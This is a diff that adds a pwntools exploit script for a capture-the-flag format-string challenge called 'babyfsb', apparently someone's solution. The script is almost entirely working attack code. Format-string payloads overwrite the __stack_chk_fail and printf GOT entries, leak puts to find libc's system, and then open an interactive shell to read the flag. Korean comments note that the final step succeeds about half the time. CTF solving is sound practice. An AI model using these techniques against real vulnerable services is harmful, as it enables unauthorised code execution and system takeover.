@@ -1,0 +1,71 @@
+from pwn import *
+
+r = remote("ctf.j0n9hyun.xyz", 3032)
+# r = process("./babyfsb/babyfsb")
+
+lib = ELF("./babyfsb/libc.so.6")
+e = ELF("./babyfsb/babyfsb")
+
+main = 0x00000000004006a6
+stack_chk_fail = 0x000000000601020
+puts = 0x601018
+printf = 0x601028
+
+# %p%p%p%p%p %p%p%p%p%p %p%p%p%p%p -> 제일 마지막게 RET
+# __stack_chk_fail -> main
+
+payload  = b""
+payload += b"%10$n"
+payload += b"%%%d"%(main >> 16)
+payload += b"c%11$hn"
+payload += b"%%%d"%((main & 0xffff) - (main >> 16))
+payload += b"c%12$hn"
+payload = payload.ljust(0x20, b"a")
+payload += p64(stack_chk_fail + 4)            # 0x28
+payload += p64(stack_chk_fail + 2)            # 0x30
+payload += p64(stack_chk_fail)                # 0x38
+
+
+
+# pause()
+r.sendlineafter("hello\n", payload)
+# pause()
+
+# puts leak
+payload  = b""
+payload += b"%10$s"
+payload = payload.ljust(0x20, b"a")
+payload += p64(puts)    
+payload = payload.ljust(0x38, b"a")
+
+r.sendlineafter("hello\n", payload)
+
+# get shell
+test = r.recvuntil("a")
+print(test)
+libc = u64(test[:-1].ljust(8, b"\x00"))
+
+print(hex(libc))
+system = libc + lib.symbols['system'] - lib.symbols['puts']
+# printf = libc + lib.symbols['printf'] - lib.symbols['puts']
+print(hex(system))
+# print(hex(printf))
+
+# libc 크기를 짤라서 해야함..
+# 대충 맞거나 틀리거나 반반임
+payload  = b""
+payload += b"%%%d"%(system& 0xffff)
+payload += b"c%11$hn"
+payload += b"%%%d"%(((system >> 16)& 0xffff)- (system & 0xffff))
+payload += b"c%12$hn"
+payload = payload.ljust(0x28, b"a")
+payload += p64(printf)           
+payload += p64(printf + 2)  
+payload = payload.ljust(0x38, b"a")
+# pause()
+
+r.sendline(payload)
+
+r.sendline("cat flag")
+
+r.interactive()
